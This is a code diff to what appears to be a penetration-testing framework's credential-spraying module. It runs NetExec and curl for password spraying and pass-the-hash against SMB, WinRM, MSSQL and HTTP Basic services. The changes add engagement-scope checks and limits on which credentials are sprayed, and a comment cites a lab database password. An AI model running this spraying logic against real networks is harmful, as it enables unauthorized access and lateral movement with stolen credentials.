@@ -76,7 +76,7 @@ from datetime import UTC, datetime, timedelta
 _SERVICE_PROTOCOLS: dict[str, dict] = {
     "ssh":   {"ports": {22, 2222}, "products": ("openssh", "ssh", "dropbear")},
     "smb":   {"ports": {445, 139}, "products": ("smb", "samba", "cifs", "netbios")},
-    "winrm": {"ports": {5985, 5986}, "products": ("winrm", "wsman", "http")},  # WinRM rides on HTTP
+    "winrm": {"ports": {5985, 5986}, "products": ("winrm", "wsman")},  # WinRM: port-identified; 'http' would mis-grab every web server
     "ldap":  {"ports": {389}, "products": ("ldap", "openldap", "active directory")},
     "ldaps": {"ports": {636}, "products": ("ldaps", "ldap")},
     "mssql": {"ports": {1433}, "products": ("mssql", "microsoft sql", "sql server")},
@@ -91,10 +91,14 @@ _SERVICE_PROTOCOLS: dict[str, dict] = {
 # — an adapter that isn't listed here is never called.
 PROTOCOL_MATCHERS: dict[str, set[str]] = {
     "password": {"ssh", "smb", "winrm", "ldap", "ldaps", "mssql", "rdp", "ftp", "http-basic"},
-    "ntlm":     {"smb", "winrm", "ldap", "ldaps", "mssql"},
+    "ntlm":     {"smb", "winrm", "mssql"},   # pass-the-hash surfaces; PtH over ldap/ldaps is unreliable
     "ssh_key":  {"ssh"},
-    "api_key":  {"http-basic"},
-    "token":    {"http-basic"},
+    # api_key / token are NOT sprayed: blindly sending a bearer token to every
+    # web root in memory ships a client secret to arbitrary hosts and treats any
+    # 200 on `/` as a valid login. Hold them in the vault; the operator decides
+    # where a token is used. (Dedicated API probing is a separate, targeted move.)
+    "api_key":  set(),
+    "token":    set(),
     "kerberos": set(),   # tickets need dedicated tooling; spray adapter TBD
     "dpapi":    set(),   # offline blob, not a live-auth cred
 }
@@ -195,6 +199,13 @@ def _candidate_services(
         q += " AND h.ip = ?"
         params.append(host_ip)
     rows = conn.execute(q, params).fetchall()
+    # Never spray a host outside the engagement scope. Use the typed matcher so
+    # exclude rows win and hostname/wildcard scopes don't degrade to "allow all":
+    # a host can enter memory from a pasted nmap file that straddles the
+    # boundary, and the sprayer must not authenticate to it.
+    from yhwach import scope as yhscope
+
+    rows = [r for r in rows if yhscope.assert_target(conn, engagement_id, r["ip"])[0]]
     if protocol:
         rows = [r for r in rows if _protocol_for(r["port"], r["product"]) == protocol]
     else:
@@ -209,7 +220,10 @@ def _candidate_creds(
     cred_id: int | None = None,
     protocol: str | None = None,
 ) -> list[sqlite3.Row]:
-    q = ("SELECT id, identifier, secret, kind FROM credential WHERE engagement_id = ?")
+    # A client-provided (assumed-breach / test) credential is NEVER sprayed:
+    # the operator was given it to use, not to validate against the estate.
+    q = ("SELECT id, identifier, secret, kind FROM credential "
+         "WHERE engagement_id = ? AND COALESCE(provenance,'discovered') != 'provided'")
     params: list = [engagement_id]
     if cred_id is not None:
         q += " AND id = ?"
@@ -318,11 +332,21 @@ def _run(cmd: list[str], *, timeout: int = _ADAPTER_TIMEOUT) -> tuple[int, str]:
 
 
 def _nxc(protocol: str, ip: str, user: str, secret: str,
-         *, port: int | None = None, local_auth: bool = False) -> tuple[str, str]:
-    """Common nxc invocation. Returns ('success'|'admin'|'fail'|'error', detail)."""
+         *, port: int | None = None, local_auth: bool = False,
+         kind: str = "password") -> tuple[str, str]:
+    """Common nxc invocation. Returns ('success'|'admin'|'fail'|'error', detail).
+
+    An ``ntlm`` credential is passed as a pass-the-hash (``-H``), never as a
+    plaintext password (``-p``) — sending a hash as a password guarantees a
+    failure, burns the account's lockout budget, and caches a false 'fail'
+    that hides working PtH access.
+    """
     if not shutil.which("nxc"):
         return "error", "nxc not on PATH"
-    cmd = ["nxc", protocol, ip, "-u", user, "-p", secret]
+    if kind == "ntlm":
+        cmd = ["nxc", protocol, ip, "-u", user, "-H", secret]
+    else:
+        cmd = ["nxc", protocol, ip, "-u", user, "-p", secret]
     if port is not None and protocol in ("winrm", "smb", "mssql", "rdp"):
         cmd += ["--port", str(port)]
     if local_auth:
@@ -358,10 +382,10 @@ def _adapter_smb(ip: str, user: str, secret: str, kind: str,
     # For SMB/WinRM/LDAP the domain vs local dimension matters. We try
     # domain-auth first (the common case on this lab's example.corp),
     # then --local-auth on a fail — the results are OR'd (any success wins).
-    r, d = _nxc("smb", ip, user, secret, port=port, local_auth=False)
+    r, d = _nxc("smb", ip, user, secret, port=port, local_auth=False, kind=kind)
     if r in ("success", "admin"):
         return r, d
-    r2, d2 = _nxc("smb", ip, user, secret, port=port, local_auth=True)
+    r2, d2 = _nxc("smb", ip, user, secret, port=port, local_auth=True, kind=kind)
     if r2 in ("success", "admin"):
         return r2, d2 + " (local-auth)"
     # Both failed — surface the more specific error.
@@ -370,10 +394,10 @@ def _adapter_smb(ip: str, user: str, secret: str, kind: str,
 
 def _adapter_winrm(ip: str, user: str, secret: str, kind: str,
                    port: int) -> tuple[str, str]:
-    r, d = _nxc("winrm", ip, user, secret, port=port, local_auth=False)
+    r, d = _nxc("winrm", ip, user, secret, port=port, local_auth=False, kind=kind)
     if r in ("success", "admin"):
         return r, d
-    r2, d2 = _nxc("winrm", ip, user, secret, port=port, local_auth=True)
+    r2, d2 = _nxc("winrm", ip, user, secret, port=port, local_auth=True, kind=kind)
     if r2 in ("success", "admin"):
         return r2, d2 + " (local-auth)"
     return r, d
@@ -388,10 +412,10 @@ def _adapter_mssql(ip: str, user: str, secret: str, kind: str,
                    port: int) -> tuple[str, str]:
     # MSSQL: try SQL auth (--local-auth) FIRST — that's what got the
     # sa:Acme-SQL-SA!2026 win. Then domain auth as a fallback.
-    r, d = _nxc("mssql", ip, user, secret, port=port, local_auth=True)
+    r, d = _nxc("mssql", ip, user, secret, port=port, local_auth=True, kind=kind)
     if r in ("success", "admin"):
         return r, d + " (sql-auth)"
-    r2, d2 = _nxc("mssql", ip, user, secret, port=port, local_auth=False)
+    r2, d2 = _nxc("mssql", ip, user, secret, port=port, local_auth=False, kind=kind)
     if r2 in ("success", "admin"):
         return r2, d2
     return r, d
@@ -409,29 +433,31 @@ def _adapter_ftp(ip: str, user: str, secret: str, kind: str,
 
 def _adapter_http_basic(ip: str, user: str, secret: str, kind: str,
                         port: int) -> tuple[str, str]:
-    """HTTP Basic on a WWW-Authenticate: Basic realm. Curl probe."""
+    """HTTP Basic on a WWW-Authenticate: Basic realm. Curl probe.
+
+    Only password creds reach here (api_key/token are not sprayed — see
+    PROTOCOL_MATCHERS). A 200 counts as success ONLY when an unauthenticated
+    request to the same URL was 401/403; otherwise a public homepage would
+    "validate" every password in the vault.
+    """
     if not shutil.which("curl"):
         return "error", "curl not on PATH"
     scheme = "https" if port in (443, 8443) else "http"
     url = f"{scheme}://{ip}:{port}/"
-    # For api_key / token we send it as a Bearer header instead of basic auth.
-    if kind in ("api_key", "token"):
-        rc, out = _run([
-            "curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
-            "-H", f"Authorization: Bearer {secret}",
-            "--max-time", "8", url,
-        ])
-    else:
-        rc, out = _run([
-            "curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
-            "-u", f"{user}:{secret}",
-            "--max-time", "8", url,
-        ])
-    code = out.strip().split("\n")[-1]
+
+    def _code(args: list[str]) -> str:
+        _rc, out = _run(
+            ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "8", *args, url]
+        )
+        return out.strip().split("\n")[-1]
+
+    baseline = _code([])
+    if baseline not in ("401", "403"):
+        # No Basic-auth challenge on this root — a 200 here proves nothing.
+        return "skipped", f"no basic-auth challenge (unauth HTTP {baseline})"
+    code = _code(["-u", f"{user}:{secret}"])
     if code in ("200", "201", "204"):
-        return "success", f"HTTP {code}"
-    if code in ("401", "403"):
-        return "fail", f"HTTP {code}"
+        return "success", f"HTTP {code} (baseline {baseline})"
     return "fail", f"HTTP {code}"
 
 
